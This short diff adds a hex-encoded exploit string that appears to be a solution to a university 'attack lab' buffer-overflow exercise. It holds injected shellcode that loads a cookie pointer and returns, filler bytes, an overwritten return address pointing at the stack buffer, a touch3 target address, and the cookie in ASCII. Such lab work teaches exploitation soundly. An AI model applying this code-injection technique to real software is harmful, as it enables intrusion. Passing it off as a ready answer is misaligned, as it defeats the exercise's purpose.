@@ -1,0 +1,8 @@
+48 c7 c7 30 22 63 55 c3 /* movq [cookie = 0x55632230], rdi; retq */
+aa aa aa aa aa aa aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa
+e8 21 63 55 00 00 00 00 /* buffer address */
+30 19 40 00 00 00 00 00 /* touch3 address */
+36 36 30 35 61 62 35 31 /* cookie! (in ascii) */
